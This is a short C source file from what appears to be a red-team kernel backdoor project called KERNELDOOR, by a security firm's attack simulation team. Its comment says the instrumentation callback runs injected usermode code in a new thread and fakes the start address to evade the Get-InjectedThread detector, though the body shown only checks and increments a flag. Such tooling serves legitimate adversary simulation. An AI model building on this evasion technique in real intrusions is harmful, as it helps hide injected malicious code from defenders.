/*!
 *
 * KERNELDOOR
 *
 * GuidePoint Security LLC
 *
 * Threat and Attack Simulation Team
 *
!*/

#include "Common.h"

typedef struct
{
	D_API( ZwSetInformationProcess );
	D_API( ZwAllocateVirtualMemory );
	D_API( ZwClose );
} API ;

/*!
 *
 * Purpose:
 *
 * Prepares the custom usermode code for execution by
 * creating a thread. Fakes the start address to try
 * and avoid Get-InjectedThread.
 *
!*/
D_SEC( D ) VOID NTAPI InstrumentationCallbackEnt( VOID )
{
	API	Api;

	RtlSecureZeroMemory( &Api, sizeof( Api ) );

	/* Check if we have been fired yet: If not, continue */
	if ( ! InterlockedExchangeAdd( C_PTR( G_PTR( UmEvt ) ), 0 ) ) {
		/* Fired, continue without recursion */
		InterlockedIncrement( C_PTR( G_PTR( UmEvt ) ) );
	};
};
